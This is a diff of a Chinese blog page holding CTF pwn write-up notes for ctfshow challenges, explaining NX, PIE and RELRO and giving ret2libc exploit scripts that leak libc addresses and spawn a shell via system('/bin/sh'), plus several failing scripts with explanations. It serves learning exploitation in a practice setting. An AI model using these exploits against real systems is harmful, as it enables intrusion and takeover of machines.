@@ -647,21 +647,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-26
+                    2023-07-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    23.5k
+                    27.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    94 分
+                    109 分
                 </div>
                 
 
@@ -1872,28 +1872,41 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <p>然后，ret2libc是一种绕过NX保护的攻击方法。由于NX保护阻止在非执行内存（如堆和栈）上执行代码，攻击者不能简单地插入并执行恶意代码。但是，攻击者可以利用已经存在的可执行代码片段，这些代码片段就是程序已经加载的库函数，例如C标准库libc。</p>
 <p>在ret2libc攻击中，攻击者利用缓冲区溢出漏洞，改变返回地址，使其指向libc中的函数（如system），并在栈上布置参数。这样，当函数返回时，不会返回到原来的位置，而是跳转到libc的函数，执行攻击者预设的命令。这种攻击方法不需要在内存中注入新的代码，所以可以绕过NX保护。</p>
 <p>所以，”开启NX保护，或许可以试试ret2libc”的意思是，如果目标系统开启了NX保护，可以考虑使用ret2libc这种攻击策略。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-from LibcSearcher import *
-context.log_level = 'debug'
-#io = process('./pwn')
-#io = remote('127.0.0.1',10000)
-io = remote("pwn.challenge.ctf.show", 28177)
-elf = ELF('./pwn')
-main = elf.sym['main']
-write_got = elf.got['write']
-write_plt = elf.plt['write']
-payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) +
-p32(write_got) + p32(4)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  # 导入 pwntools 库，它是一个用于CTF和二进制安全的Python库。
+from LibcSearcher import *  # 导入 LibcSearcher 库，它可以帮助找到正确的 libc 版本和寻找偏移。
+
+context.log_level = 'debug'  # 设置日志级别为 debug，将在运行时显示更详细的信息。
+
+#io = process('./pwn')  # 这行被注释掉了，如果运行，将在本地启动 pwn 程序。
+#io = remote('127.0.0.1',10000)  # 这行被注释掉了，如果运行，将连接本地的 10000 端口。
+io = remote("pwn.challenge.ctf.show", 28177)  # 连接远程服务器的 28177 端口。
+
+elf = ELF('./pwn')  # 读取 './pwn' 文件的 ELF 信息。
+
+main = elf.sym['main']  # 获取 'main' 函数的地址。
+write_got = elf.got['write']  # 获取 'write' 函数在 GOT 表中的地址。
+write_plt = elf.plt['write']  # 获取 'write' 函数在 PLT 表中的地址。
+
+# 构造并发送 payload，触发缓冲区溢出，并尝试执行 write 函数，然后返回到 main 函数。
+payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)
 io.sendline(payload)
-write = u32(io.recv(4))
-print hex(write)
-libc = LibcSearcher('write',write)
-libc_base = write - libc.dump('write')
-system = libc_base + libc.dump('system')
-bin_sh = libc_base + libc.dump('str_bin_sh')
+
+write = u32(io.recv(4))  # 接收 4 字节数据，并将其转化为无符号整型。这应该是运行时 'write' 函数的地址。
+
+print hex(write)  # 打印 write 函数的地址。
+
+libc = LibcSearcher('write',write)  # 使用 'write' 函数的地址，查找对应的 libc 版本。
+libc_base = write - libc.dump('write')  # 计算 libc 的基址。
+
+system = libc_base + libc.dump('system')  # 计算 'system' 函数的地址。
+bin_sh = libc_base + libc.dump('str_bin_sh')  # 计算 '/bin/sh' 字符串的地址。
+
+# 构造并发送新的 payload，再次触发缓冲区溢出，并尝试执行 system 函数打开一个 shell。
 payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)
 io.sendline(payload)
-io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+io.interactive()  # 进入交互模式，这样就可以手动输入命令。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -2515,6 +2528,29 @@ main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 
 
 
+<h3 id="（二）C源代码"><a href="#（二）C源代码" class="headerlink" title="（二）C源代码"></a>（二）C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0, 1, 0);
+  setvbuf(stdout, 0, 2, 0);
+  printf("%p\n", main);
+  ctfshow(&amp;argc);
+  puts(asc_854);
+  puts(asc_8C8);
+  puts(asc_944);
+  puts(asc_9D0);
+  puts(asc_A60);
+  puts(asc_AE4);
+  puts(asc_B78);
+  puts("    * *************************************                           ");
+  puts(aClassifyCtfsho);
+  puts("    * Type  : Linux_Security_Mechanisms                               ");
+  puts("    * Site  : https://ctf.show/                                       ");
+  puts("    * Hint  : Bypass ALSR &amp; PIE ");
+  puts("    * *************************************                           ");
+  write(0, "Hello CTFshow!\n", 0xEu);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
 
 
@@ -2522,6 +2558,164 @@ main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 
 
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020622786.png" alt="image-20230726020622786"></p>
+<ul>
+<li>RELRO: Full RELRO：RELRO是Relocation Read-Only的缩写，它是一种保护机制，可以防止攻击者修改GOT表。Full RELRO表示启用了完全的RELRO保护，这意味着GOT表在程序启动后就被设置为只读，我们不能直接修改GOT表来改变函数的地址。</li>
+<li>Stack: No canary found：这表示程序的栈没有启用栈保护（也称为栈溢出保护或栈破坏检测）。通常，启用栈保护的程序会在每个函数的栈帧中添加一个“栈保护”，这是一个随机的值。在函数返回前，程序会检查这个值是否被改变，如果被改变，程序就会立即崩溃，防止攻击者利用缓冲区溢出覆盖函数的返回地址。但是在这个程序中，没有启用栈保护，所以我们可以通过缓冲区溢出来覆盖函数的返回地址。</li>
+<li>NX: NX enabled：NX是No-eXecute的缩写，它是一种保护机制，可以防止攻击者在栈或堆上执行代码。启用NX保护的程序会将栈和堆设置为不可执行，这意味着我们不能直接在栈或堆上执行shellcode。但是我们仍然可以使用ROP（Return-oriented programming）技术来执行代码。</li>
+<li>PIE: PIE enabled：PIE是Position Independent Executable的缩写，它是一种保护机制，可以使程序的地址空间布局随机化。启用PIE的程序每次运行时，它的代码、数据和栈的地址都会随机变化。这意味着我们不能直接使用固定的地址来攻击程序，而需要先泄露一些地址，然后基于这些地址来计算其他地址。</li>
+</ul>
+<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+io = remote('pwn.challenge.ctf.show', 28169)
+elf = ELF('./pwn031')
+libc = ELF('/lib32/libc.so.6')
+main = int(io.recvline(),16)
+base = main - elf.sym['main']
+ctfshow = base + elf.sym['ctfshow']
+write_plt = base + elf.sym['write']
+write_got = base + elf.got['write']
+ebx = base + 0x1fc0
+payload =b"A" * 132 + p32(ebx) + b"AAAA" + p32(write_plt) + p32(ctfshow) + p32(1) + p32(write_got) + p32(4)
+io.send(payload)
+write = u32(io.recv())
+libc_base = write - libc.sym['write']
+system_addr = libc_base + libc.sym['system']
+binsh_addr = libc_base + next(libc.search('/bin/sh'))
+payload = "B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)
+io.send(payload)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="1-开了NX，无法直接覆盖执行shellcode"><a href="#1-开了NX，无法直接覆盖执行shellcode" class="headerlink" title="1.开了NX，无法直接覆盖执行shellcode"></a>1.开了NX，无法直接覆盖执行shellcode</h4><h4 id="2-开了PIE"><a href="#2-开了PIE" class="headerlink" title="2.开了PIE"></a>2.开了PIE</h4><p>PIE（位置独立可执行文件）是一种保护机制，它将使得每次程序运行时的加载地址都是随机的，这包括代码段、数据段、堆和栈等。由于这个随机性，我们无法直接知道函数或变量的绝对地址。</p>
+<p>在你的例子中，<code>write_got = elf.got['write']</code> 是试图获取 ‘write’ 函数在 GOT 表中的地址。然而，如果启用了 PIE，这个地址在每次程序运行时都会发生改变，所以这样直接获取的地址并不能在运行时使用。</p>
+<p>解决这个问题的一种常见方法是信息泄露（Information Leak），即通过一些方式（如格式化字符串漏洞、越界读等）获取到运行时的内存布局信息，进而计算出真正的运行时地址。另外，一些保护绕过技巧，如部分重叠覆盖（Partial Overwrite）、返回导向编程（ROP）等，也经常被用来对抗 PIE。</p>
+<p>综上，如果启用了PIE，直接使用诸如 <code>elf.got['write']</code> 这样的方式来获取函数或变量的地址是不可行的。需要先找到信息泄露的点，获取到程序运行时的实际加载地址，然后基于这个地址来计算出函数或变量在运行时的真实地址。</p>
+<h4 id="3-知道main函数地址"><a href="#3-知道main函数地址" class="headerlink" title="3.知道main函数地址"></a>3.知道main函数地址</h4><p>如果你已经知道了程序运行时 <code>main</code> 函数的地址，这可以帮助你计算出其他函数或变量的运行时地址，这是因为你可以根据这个已知的地址和你在二进制文件中看到的偏移来计算出其他地址。这就是基于信息泄露获取内存布局信息的基本思想。</p>
+<p>在你的例子中，假设你已经知道了 <code>main</code> 函数在运行时的地址（例如 <code>0x56557652</code>），你也知道了 <code>main</code> 函数和 <code>write</code> 函数在二进制文件中的偏移量（这可以通过分析二进制文件得到）。那么，你就可以用 <code>main</code> 函数的运行时地址加上这个偏移量，得到 <code>write</code> 函数的运行时地址。</p>
+<p>请注意，这种方法的前提是你的程序是位置独立的（也就是说，启用了PIE），并且你已经通过某种方式（例如，格式化字符串漏洞、越界读等）获得了一些内存布局信息。在没有任何内存布局信息的情况下，你将无法确定这些运行时地址。</p>
+<h4 id="4-尝试泄露和利用write函数地址"><a href="#4-尝试泄露和利用write函数地址" class="headerlink" title="4.尝试泄露和利用write函数地址"></a>4.尝试泄露和利用write函数地址</h4><p>在IDA中，这行代码表示一个名为 <code>write</code> 的外部函数。下面是每个字段的含义：</p>
+<ul>
+<li><p><code>write</code>：这是该项的名称，也就是函数名。</p>
+</li>
+<li><p><code>extern</code>：这表明 <code>write</code> 是一个外部函数，也就是说，它的实现不在当前的二进制文件中，而是在某个外部的库（比如libc库）中。</p>
+</li>
+<li><p><code>00002024</code>：这是 <code>write</code> 在GOT（全局偏移表）中的地址。由于 <code>write</code> 是一个外部函数，所以在运行时，它的真实地址会被填充到GOT中的这个位置。</p>
+</li>
+<li><p><code>00000004</code>：这个字段通常表示该项的大小。在这个例子中，它表示 <code>write</code> 函数的地址在GOT中的大小，也就是4字节。</p>
+</li>
+<li><p><code>00000000</code>：这个字段表示该项的值。由于 <code>write</code> 是一个外部函数，所以在这里，它的值是0。</p>
+</li>
+<li><p><code>R</code>：这表示该项是只读的。</p>
+</li>
+<li><p><code>T</code>：这表示该项是一个文本项，也就是说，它是一个函数。</p>
+</li>
+</ul>
+<p>要注意的是，因为 <code>write</code> 是一个外部函数，所以你无法直接通过在二进制文件中找到它的地址。然而，你可以通过分析程序在运行时的内存布局，找到它的真实地址。这通常涉及到一些内存泄露的技术，或者通过GOT和PLT（程序链接表）来找到它的地址。</p>
+<h4 id="5-python3-pwn031-py报错"><a href="#5-python3-pwn031-py报错" class="headerlink" title="5.python3 pwn031.py报错"></a>5.python3 pwn031.py报错</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230728002837740.png" alt="image-20230728002837740"></p>
+<p>看起来你正在使用 Python 3，但 <code>print</code> 的语法是按照 Python 2 的语法写的。在 Python 3 中，<code>print</code> 是一个函数，所以你应该使用括号。尝试将你的代码修改为如下形式：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">print(hex(write))  # 打印 write 函数的地址。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在 Python 3 中，所有的 <code>print</code> 语句都需要用括号包裹其参数。这是 Python 2 和 Python 3 的主要区别之一。如果你的代码还有其他的 <code>print</code> 语句，也要做同样的修改。</p>
+<h4 id="6-脚本错误-x-1"><a href="#6-脚本错误-x-1" class="headerlink" title="6.脚本错误 x 1"></a>6.脚本错误 x 1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+io = remote('pwn.challenge.ctf.show', 28169)
+elf = ELF('./pwn031')
+libc = ELF('/lib32/libc.so.6')
+# 程序加载到内存中的基址
+base_addr = 0x56557000
+# main函数的地址
+main = 0x56557652
+# write在GOT表中的偏移量（使用IDA获取）
+write_got_offset = 0x2024
+# 计算write在内存中的真实地址
+write_got = base_addr + write_got_offset
+write_plt = elf.plt['write']
+payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)
+io.sendline(payload)
+write = u32(io.recv(4))
+print(hex(write))
+libc = LibcSearcher('write',write)
+libc_base = write - libc.dump('write')
+system = libc_base + libc.dump('system')
+bin_sh = libc_base + libc.dump('str_bin_sh')
+payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)
+io.sendline(payload)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230728012938638.png" alt="image-20230728012938638"></p>
+<p>对于动态链接库的函数，它们的确切地址在运行时才会被确定，因此在静态分析阶段我们不能直接从ELF文件中获取它们的地址。</p>
+<p>在你的情况中，<code>write</code>函数是一个系统调用，它的实际实现在glibc库中，因此你不能从你的ELF文件中直接获取它的地址。你需要在运行时确定它的地址。</p>
+<p>然后，你在代码中尝试使用<code>write_plt = elf.plt['write']</code>获取<code>write</code>函数的地址，这在正常情况下应该是有效的。但是如果你的程序并没有直接调用<code>write</code>函数，那么<code>write</code>函数就不会出现在PLT表中，导致这行代码会引发KeyError。</p>
+<p>在你的情况下，如果你知道<code>write</code>函数的确切地址，你可以直接使用这个地址。但是如果你不知道确切的地址，你可能需要使用其他的技术来获取这个地址，比如使用ROP链或者返回到PLT（Return-to-plt）等技术。</p>
+<h4 id="7-错误脚本x2"><a href="#7-错误脚本x2" class="headerlink" title="7.错误脚本x2"></a>7.错误脚本x2</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+io = remote('pwn.challenge.ctf.show', 28169)
+elf = ELF('./pwn031')
+libc = ELF('/lib32/libc.so.6')
+main=0x56557652
+
+rop = ROP(elf)  # 创建一个 ROP 对象
+rop.call(gadget_address, [1, got_write_address, 4])  # 调用你的 gadget，第一个参数是文件描述符，第二个参数是要写的地址，第三个参数是写的字节数
+io.sendline(cyclic(0x88+0x4) + str(rop))  # 发送 payload
+
+write = u32(io.recv(4))  # 接收 write 函数的运行时地址
+print(hex(write))  # 打印 write 函数的地址
+libc_base = write - libc.sym['write']  # 计算 libc 的基址
+system = libc_base + libc.sym['system']  # 计算 system 函数的地址
+bin_sh = libc_base + next(libc.search(b'/bin/sh'))  # 计算 "/bin/sh" 字符串的地址
+
+rop2 = ROP(libc)  # 创建一个新的 ROP 对象
+rop2.call(system, [bin_sh])  # 调用 system("/bin/sh")
+io.sendline(cyclic(0x88+0x4) + str(rop2))  # 发送新的 payload
+
+io.interactive()  # 进入交互模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由于 <code>write</code> 函数不在程序的导入表 (the import table, 也叫动态符号表，ELF 文件的一部分) 中，所以 <code>elf.got['write']</code> 和 <code>elf.plt['write']</code> 都会失败。这个错误告诉我们，程序并没有直接调用 <code>write</code> 函数。那么 <code>write</code> 函数是如何被调用的呢？可能是间接地通过其他函数调用的，比如 <code>printf</code> 或者 <code>puts</code>。如果是这种情况，你将无法直接从 <code>elf</code> 对象获取 <code>write</code> 函数的 GOT 和 PLT 项。</p>
+<p>然后，你的程序存在一个栈溢出漏洞，可以通过这个漏洞利用返回导向编程 (Return Oriented Programming，ROP) 技术执行任意代码。</p>
+<p>ROP 的主要思想是寻找程序中的一些代码片段 (称为 “gadgets”)，这些代码片段在执行后会返回 (即，以 RET 指令结束)。然后，你可以通过控制栈来执行这些 gadgets，以此实现任意的计算。在你的情况下，你可以使用 ROP 来调用 <code>write</code> 函数，泄露出某个已知函数的运行时地址，然后根据这个地址和你的 libc 库来计算出其他函数的运行时地址。</p>
+<p>以下是具体步骤：</p>
+<ol>
+<li><p>首先，你需要找到一个 gadget，它需要做以下的操作：调用 <code>write</code> 函数，然后返回。这个 gadget 可能看起来类似于：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push [got_write_address]  ; 把 write 函数的地址压入栈
+call [write_plt_address]  ; 调用 write 函数
+ret                       ; 返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>注意：以上的汇编代码只是一个示例，并不一定存在于你的程序中。你需要使用反编译工具 (如 IDA 或者 radare2) 来寻找合适的 gadget。</p>
+</li>
+<li><p>然后，你需要构造一个 ROP 链，调用这个 gadget 来泄露出 <code>write</code> 函数的运行时地址。在 pwntools 中，可以使用 <code>pwnlib.rop.ROP</code> 类来构造 ROP 链。一个简单的例子可能如下所示：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+io = remote('pwn.challenge.ctf.show', 28169)
+elf = ELF('./pwn031')
+libc = ELF('/home/ctfshow/libc/32bit/libc.so.6')
+main=0x56557652
+
+rop = ROP(elf)  # 创建一个 ROP 对象
+rop.call(gadget_address, [1, got_write_address, 4])  # 调用你的 gadget，第一个参数是文件描述符，第二个参数是要写的地址，第三个参数是写的字节数
+io.sendline(cyclic(0x88+0x4) + str(rop))  # 发送 payload
+
+write = u32(io.recv(4))  # 接收 write 函数的运行时地址
+print(hex(write))  # 打印 write 函数的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中，<code>gadget_address</code> 是你在第一步中找到的 gadget 的地址，<code>got_write_address</code> 是 <code>write</code> 函数的 GOT 表项的地址。</p>
+</li>
+<li><p>一旦你获取到了 <code>write</code> 函数的运行时地址，你可以计算出其他函数的运行时地址，然后再构造一个新的 ROP 链来调用 <code>system("/bin/sh")</code>，以获取 shell。例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">libc_base = write - libc.sym['write']  # 计算 libc 的基址
+system = libc_base + libc.sym['system']  # 计算 system 函数的地址
+bin_sh = libc_base + next(libc.search(b'/bin/sh'))  # 计算 "/bin/sh" 字符串的地址
+
+rop2 = ROP(libc)  # 创建一个新的 ROP 对象
+rop2.call(system, [bin_sh])  # 调用 system("/bin/sh")
+io.sendline(cyclic(0x88+0x4) + str(rop2))  # 发送新的 payload
+
+io.interactive()  # 进入交互模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<p>以上的所有代码都是示例性的，并且基于你的原始代码，可能需要根据你的具体情况进行修改。在具体实施过程中，可能还会遇到各种问题。比如：</p>
+<ul>
+<li>找到正确的 gadget 可能是一项挑战。一个可用的方法是使用像 <code>ROPgadget</code> 这样的工具，它可以自动分析二进制文件，寻找可能的 gadgets。</li>
+<li>在实际的 exploitation 中，可能还需要处理各种细节问题，比如需要注意栈对齐的问题，确保不会因为对齐问题而导致 crash。</li>
+<li>在你获得 shell 后，还需要保证可以持续和 shell 交互。在某些情况下，你可能需要在你的 ROP 链中包含一些额外的 gadgets，来确保你可以持续和新的 shell 进程进行交互。</li>
+</ul>
+<p>希望以上的解释和示例代码可以帮助你理解如何利用 ROP 来绕过全局偏移表 (GOT) 和过程链接表 (PLT) 的问题，从而成功利用这个漏洞。不过，我还是需要强调，每个 exploitation 都是具体的，以上的示例代码可能并不完全适用于你的情况。你可能需要进行一些调整，或者采用一些额外的技术和策略，才能成功利用这个漏洞。</p>
 
                 
             </div>
@@ -3385,7 +3579,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">48.6k</span>&nbsp;字
+                class="white-color">52.4k</span>&nbsp;字
             
             
             
